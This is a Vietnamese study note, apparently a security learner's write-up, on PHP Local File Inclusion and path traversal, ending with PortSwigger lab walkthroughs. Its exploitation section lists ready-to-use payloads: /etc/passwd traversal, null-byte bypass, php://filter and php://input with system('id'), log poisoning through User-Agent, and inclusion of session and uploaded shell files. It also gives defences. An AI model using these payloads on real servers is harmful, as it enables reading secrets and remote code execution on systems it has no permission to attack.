# LFI vul (Local File Inclusion)

## 1. Khái niệm
- **Local File Inclusion (LFI)** là một lỗ hổng bảo mật web xảy ra khi ứng dụng không kiểm tra hoặc lọc dữ liệu đầu vào một cách chặt chẽ. LFI cho phép kẻ tấn công chỉ định đường dẫn tới các file trên máy chủ, dẫn đến việc tải hoặc thực thi các file đó.

---

## 2. Nguyên Nhân
- Ứng dụng chấp nhận dữ liệu đầu vào từ người dùng mà không kiểm tra đúng cách.
- Sử dụng các hàm như `include()`, `require()`, `include_once()` hoặc `require_once()` mà không lọc đầu vào.
- Thiếu các biện pháp bảo vệ như kiểm tra whitelist hoặc mã hóa đường dẫn.

---

## 3. LFI và Path Traversal
### 3.1. Path Traversal
- **Path Traversal** là một lỗ hổng bảo mật cho phép kẻ tấn công truy cập các file không được phép trên server bằng cách thay đổi đường dẫn file. **Path Traversal** thường chỉ cho phép **đọc file mà không thực thi chúng**.

Ví dụ:
```http
http://example.com/index.php?file=../../etc/passwd
```

### 3.2. Local File Inclusion (LFI)
- **LFI** không chỉ **cho phép truy cập file** mà còn có khả năng **thực thi nội dung file**, đặc biệt khi ứng dụng sử dụng các hàm như `include()`. LFI có thể dẫn đến **Remote Code Execution (RCE)**.

- Ví dụ:
```http
http://example.com/index.php?page=../../var/log/apache2/access.log
```
- Nếu ta chèn mã độc vào log file, mã này có thể được thực thi thông qua LFI.

| Tiêu Chí                  | Path Traversal                  | Local File Inclusion (LFI)       |
|---------------------------|---------------------------------|-----------------------------------|
| Mục tiêu chính            | Đọc file                        | Đọc và có thể thực thi file       |
| Hàm liên quan             | Không yêu cầu `include()`       | Yêu cầu các hàm như `include()`  |
| Mức độ nguy hiểm          | Cao                            | Rất cao                          |
| Ví dụ payload             | `../../etc/passwd`             | `../../var/log/apache2/access.log` |

---

## 4. Cách Khai Thác

### 4.1. Khai Thác Cơ Bản
- Thay đổi giá trị tham số để tải các file nhạy cảm trên máy chủ:
```http
http://example.com/index.php?page=../../etc/passwd
```
- Payload `../../etc/passwd` sử dụng ký tự `../` để truy cập các thư mục cấp cao hơn.

### 4.2. Null Byte Injection
- Trong PHP < 5.3, ký tự null byte (`%00`) có thể bypass kiểm tra đuôi file:
```http
http://example.com/index.php?page=../../etc/passwd%00
```

### 4.3. Sử Dụng PHP Wrappers
- **Đọc file bằng `php://filter`**:
```http
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
- **Thực thi payload qua `php://input`**:
```http
POST /index.php?page=php://input

- Payload:
<?php system('id'); ?>
```

### 4.4. Chèn Mã Vào Log Files
- **Chi Tiết**:
  1. Kẻ tấn công gửi một yêu cầu HTTP chứa mã độc trong header (ví dụ: `User-Agent`).
  2. Mã độc được ghi vào log file của server (thường ở `/var/log/apache2/access.log`).
  3. LFI được sử dụng để đọc và thực thi log file đó.
- **Ví Dụ Payload**:
  ```http
  GET /index.php?page=../../var/log/apache2/access.log HTTP/1.1
  User-Agent: <?php system('id'); ?>
  ```
- **Giải Thích**: Nếu server log không được bảo vệ, mã độc có thể được thực thi ngay khi `include()` được gọi đến log file.

### 4.5. Khai Thác Session Files
- **Chi Tiết**:
  1. PHP lưu session của người dùng dưới dạng file tại thư mục `/var/lib/php/sessions/` (hoặc tương đương).
  2. Kẻ tấn công tạo session chứa mã độc thông qua ứng dụng web.
  3. Sử dụng LFI để đọc và thực thi file session này.
- **Ví Dụ Payload**:
  ```http
  GET /index.php?page=/var/lib/php/sessions/sess_<session_id>
  ```
- **Giải Thích**: Nếu nội dung của file session chứa mã PHP, nó sẽ được thực thi khi `include()` gọi đến.

### 4.6. Khai Thác File Upload
- **Chi Tiết**:
  1. Ứng dụng cho phép upload file mà không kiểm tra định dạng hoặc nội dung.
  2. Kẻ tấn công upload một file PHP chứa mã độc (ví dụ: shell).
  3. Sử dụng LFI để bao gồm và thực thi file đã upload.
- **Ví Dụ Payload**:
  ```http
  GET /index.php?page=uploads/shell.php
  ```
- **Giải Thích**: LFI hoạt động như một cách để thực thi file độc hại đã được tải lên.

---

## 5. Mục Tiêu Phổ Biến
- **Tệp cấu hình**:
  - `/etc/passwd`: Danh sách người dùng hệ thống.
  - `config.php`: File chứa thông tin cấu hình database.
- **Log Files**: `/var/log/apache2/access.log`, `/var/log/nginx/access.log`.
- **Session Files**: `/var/lib/php/sessions/`.

---

## 6. Tác Động
- Đọc các file nhạy cảm như mật khẩu, cấu hình server.
- Thực thi mã độc trên server (Remote Code Execution).
- Lấy thông tin để thực hiện các cuộc tấn công khác, như privilege escalation.

---

## 7. Cách Phòng Chống
- **Kiểm tra và lọc dữ liệu đầu vào**:
  - Chỉ cho phép các file trong danh sách whitelist.
  - Sử dụng hàm `basename()` để lọc đường dẫn.

- **Mã hóa và kiểm tra đầu vào**:
  - Chặn các ký tự đặc biệt như `../`, `%00`.
  - Sử dụng hàm `realpath()` để xác minh đường dẫn.

- **Giới hạn quyền truy cập file**:
  - Chỉ cung cấp quyền truy cập tối thiểu cho các file cần thiết.
  - Tắt hiển thị lỗi (disable error messages).

- **Cấu hình server**:
  - Tắt `allow_url_include` và `allow_url_fopen` trong PHP.
  - Vô hiệu hóa các PHP wrappers không cần thiết.

---

## 8. Công Cụ Hỗ Trợ
- **Burp Suite**: Để intercept và test payloads.
- **FFUF**: Brute force các đường dẫn file nhạy cảm.
- **Dirb**: Tìm kiếm các file ẩn hoặc nhạy cảm trên server.

---

## Demo
- Ở đây mình sẽ làm 1 số chall cơ bản liên quan để **Path Traversal** và **LFI**.
### Portswigger
**[Lab: File path traversal, simple case](https://portswigger.net/web-security/learning-paths/path-traversal/reading-arbitrary-files-via-path-traversal/file-path-traversal/lab-simple)**
![image](https://github.com/user-attachments/assets/3720b002-e979-45c3-9fb5-2e6890d4cce6)
- Sử dụng Burp Suite bắt request tải ảnh về sau đó chỉnh sửa để có được nội dung file `passwd`.

![image](https://github.com/user-attachments/assets/9896f6a8-f561-4089-9d26-8eaad69a99f0)

**[Lab: File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/learning-paths/path-traversal/common-obstacles-to-exploiting-path-traversal-vulnerabilities/file-path-traversal/lab-absolute-path-bypass)**

![image](https://github.com/user-attachments/assets/56683f2d-61a4-49ec-a407-8085a14a8203)
- Tương tự chall trên tuy nhiên lần này đường dẫn chỉ là `/etc/passwd`.

![image](https://github.com/user-attachments/assets/df1a3944-1e9c-4bf4-9198-04714da3de42)